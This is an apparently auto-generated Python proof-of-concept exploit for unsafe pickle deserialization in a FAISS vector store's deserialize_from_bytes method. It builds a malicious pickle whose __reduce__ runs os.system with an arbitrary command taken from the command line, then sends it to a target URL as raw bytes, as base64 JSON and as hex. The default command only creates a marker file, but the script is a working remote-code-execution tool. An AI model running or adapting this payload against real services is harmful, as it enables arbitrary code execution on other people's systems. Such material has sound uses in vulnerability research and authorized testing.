#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-016
# Sink: deserialize_from_bytes
# Auto-generated — run with: python3 rce_function_deserialize_bytes_calls_deserialize_from_bytes.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for unsafe pickle deserialization in
langchain-community-only's FAISS vector store.

Vulnerability: The deserialize_from_bytes class method calls pickle.loads()
on attacker-controlled bytes without any validation, allowing arbitrary code
execution during deserialization.

This PoC demonstrates the vulnerability by creating a malicious pickle payload
that executes a benign command (creates /tmp/poc_success.txt) and sends it to
a simulated vulnerable endpoint.
"""

import pickle
import os
import sys
import requests
import base64
import subprocess

# =============================================================================
# Configuration - modify these as needed
# =============================================================================
TARGET_URL = "http://localhost:8080/api/v1/trigger"  # The vulnerable endpoint
TIMEOUT = 10  # Request timeout in seconds

# =============================================================================
# Malicious pickle payload generation
# =============================================================================

class MaliciousPickle:
    """
    A class whose __reduce__ method returns a command to execute.
    When pickle.loads() deserializes an instance of this class, it will
    execute the command specified in the constructor.
    """
    def __init__(self, cmd):
        self.cmd = cmd
    
    def __reduce__(self):
        # This tells pickle to call os.system with our command
        return (os.system, (self.cmd,))

def create_payload(command: str) -> bytes:
    """
    Create a malicious pickle payload that executes the given command.
    
    Args:
        command: The shell command to execute on the target
        
    Returns:
        Bytes containing the malicious pickle payload
    """
    payload = MaliciousPickle(command)
    return pickle.dumps(payload)

def create_simulated_faiss_payload(command: str) -> bytes:
    """
    Create a payload that mimics the structure expected by deserialize_from_bytes.
    The function expects a tuple of (index, docstore, index_to_docstore_id).
    We'll make all three elements execute our command.
    
    Args:
        command: The shell command to execute on the target
        
    Returns:
        Bytes containing the malicious pickle payload
    """
    # Create three malicious objects, each will execute the command
    # when deserialized. The function unpacks these as:
    # index, docstore, index_to_docstore_id = pickle.loads(serialized)
    malicious_obj = MaliciousPickle(command)
    payload_tuple = (malicious_obj, malicious_obj, malicious_obj)
    return pickle.dumps(payload_tuple)

# =============================================================================
# Exploit execution
# =============================================================================

def exploit(target_url: str, command: str = "touch /tmp/poc_success.txt"):
    """
    Send the malicious pickle payload to the vulnerable endpoint.
    
    Args:
        target_url: The URL of the vulnerable endpoint
        command: The command to execute (default: benign touch command)
    """
    print(f"[*] Target URL: {target_url}")
    print(f"[*] Command to execute: {command}")
    
    # Create the malicious payload
    payload_bytes = create_simulated_faiss_payload(command)
    
    # Encode as base64 for safe HTTP transmission (if needed)
    payload_b64 = base64.b64encode(payload_bytes).decode()
    
    print(f"[*] Payload size: {len(payload_bytes)} bytes")
    print(f"[*] Base64 payload: {payload_b64[:100]}...")
    
    # Try different ways to send the payload
    # Method 1: Send as raw bytes in request body
    print("\n[*] Attempting exploit via raw bytes in request body...")
    try:
        response = requests.post(
            target_url,
            data=payload_bytes,
            timeout=TIMEOUT,
            headers={"Content-Type": "application/octet-stream"}
        )
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response body: {response.text[:500]}")
    except requests.exceptions.ConnectionError:
        print("[!] Connection refused - target may not be running")
    except requests.exceptions.Timeout:
        print("[!] Request timed out")
    except Exception as e:
        print(f"[!] Error: {e}")
    
    # Method 2: Send as base64-encoded string in JSON
    print("\n[*] Attempting exploit via base64 in JSON body...")
    try:
        response = requests.post(
            target_url,
            json={"serialized": payload_b64},
            timeout=TIMEOUT
        )
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response body: {response.text[:500]}")
    except requests.exceptions.ConnectionError:
        print("[!] Connection refused - target may not be running")
    except requests.exceptions.Timeout:
        print("[!] Request timed out")
    except Exception as e:
        print(f"[!] Error: {e}")
    
    # Method 3: Send as hex-encoded string
    print("\n[*] Attempting exploit via hex-encoded string...")
    try:
        payload_hex = payload_bytes.hex()
        response = requests.post(
            target_url,
            data=payload_hex,
            timeout=TIMEOUT,
            headers={"Content-Type": "text/plain"}
        )
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response body: {response.text[:500]}")
    except requests.exceptions.ConnectionError:
        print("[!] Connection refused - target may not be running")
    except requests.exceptions.Timeout:
        print("[!] Request timed out")
    except Exception as e:
        print(f"[!] Error: {e}")
    
    print("\n[*] Exploit attempts completed.")
    print("[*] Check if /tmp/poc_success.txt was created on the target.")
    print("[*] You can verify by running: ls -la /tmp/poc_success.txt")

# =============================================================================
# Main execution
# =============================================================================

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(
        description="PoC exploit for unsafe pickle deserialization in langchain-community-only"
    )
    parser.add_argument(
        "-u", "--url",
        default=TARGET_URL,
        help=f"Target URL (default: {TARGET_URL})"
    )
    parser.add_argument(
        "-c", "--command",
        default="touch /tmp/poc_success.txt",
        help="Command to execute on target (default: touch /tmp/poc_success.txt)"
    )
    parser.add_argument(
        "--verify",
        action="store_true",
        help="Verify if the exploit succeeded by checking for /tmp/poc_success.txt locally"
    )
    
    args = parser.parse_args()
    
    if args.verify:
        # Check locally if the file was created (only works if running on target)
        if os.path.exists("/tmp/poc_success.txt"):
            print("[+] SUCCESS: /tmp/poc_success.txt exists!")
            print("[+] The exploit worked!")
        else:
            print("[-] /tmp/poc_success.txt not found locally.")
            print("[*] This check only works if you're running on the target machine.")
    else:
        exploit(args.url, args.command)
    
    print("\n[*] PoC complete.")
    print("[*] Remember: This is for educational/authorized testing only!")
